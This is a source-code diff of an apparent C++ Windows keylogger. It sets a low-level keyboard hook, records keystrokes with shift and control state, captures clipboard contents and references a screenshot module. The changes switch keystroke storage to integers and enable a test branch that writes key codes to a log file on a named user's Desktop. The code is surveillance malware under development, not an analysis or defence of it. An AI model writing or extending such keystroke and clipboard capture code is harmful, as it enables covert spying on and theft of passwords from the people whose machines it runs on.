@@ -3,14 +3,17 @@
 #include "grabClipboard.h"
 #include "monitor.h"
 #include "takeScreenshot.h"
+#include "encodeStr.h"
 
-std::vector<std::string> savedChars = {}; //have to use string for TAB and stuff like that.
+//std::vector<std::string> savedChars = {}; //have to use string for TAB and stuff like that.
+std::vector<int> savedChars = {};
 std::vector<std::string> savedSentences = { "" }; //init emtpy string fist off
 std::string storedClipboardContents = "";
 
 //main entry point
 
 HHOOK* handle_to_hook = new HHOOK;
+
 bool is_shift_on = false; //GLOBAL
 bool is_control_on = false; //global
 
@@ -29,10 +32,6 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 	is_shift_on = handleShift();
 	is_control_on = handleCTRL();
 
-	//shift handling handling here, we do not need to print anything :)
-
-	//we're gonna have to handle this a differnt way if we're actually going to log anything in a txt...
-
 	auto vk = keyboardStruct->vkCode;
 
 	if (vk != VK_LSHIFT && vk != VK_RSHIFT && vk != VK_LCONTROL && vk != VK_RCONTROL && wparam == WM_KEYDOWN)
@@ -43,8 +42,8 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 		//if (is_control_on)
 		//	curCharStr += "c";
 
-		std::string curCharStr = std::to_string(handleCharsFinal(vk, is_shift_on));
-
+		//std::string curCharStr = std::to_string(handleCharsFinal(vk, is_shift_on));
+		//savedChars.push_back(curCharStr);
 	}
 	
 	if (grabClipboard(storedClipboardContents))
@@ -67,13 +66,18 @@ __forceinline void startHook()
 	}
 }
 
-#define test false;
+#define test true;
 
 int main()
 {
 #if test
 
-
+	std::vector<int> ch{1, 12, 5, 10, 587, 87, 176};
+	int count = 0;
+	if (flushChars(ch, "C:\\Users\\Anton C\\Desktop\\log0102.txt", count, false))
+	{
+		std::cout << "success";
+	}
 
 #else
 	startHook();
